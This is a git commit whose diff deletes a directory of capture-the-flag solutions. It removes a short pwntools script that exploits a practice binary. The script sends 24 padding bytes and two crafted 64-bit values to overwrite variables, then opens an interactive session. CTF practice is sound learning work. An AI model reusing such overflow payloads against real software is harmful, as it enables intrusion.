e5f20ee3bea0d18c54593165225ff5af56911ae8
xtxnb <94107819+xtxnb@users.noreply.github.com>
2022-04-05 19:26:53 +0800

    Delete buuctf directory

--- buuctf/2018_gettingStart/r.py
+++
@@ -1,8 +0,0 @@
-from pwn import*
-elf=ELF('./2018_gettingStart')
-p=process('./2018_gettingStart')
-
-payload=b'a'*24+p64(0x7fffffffffffffff)+p64(0x3FB999999999999A)
-
-p.sendline(payload)
-p.interactive()
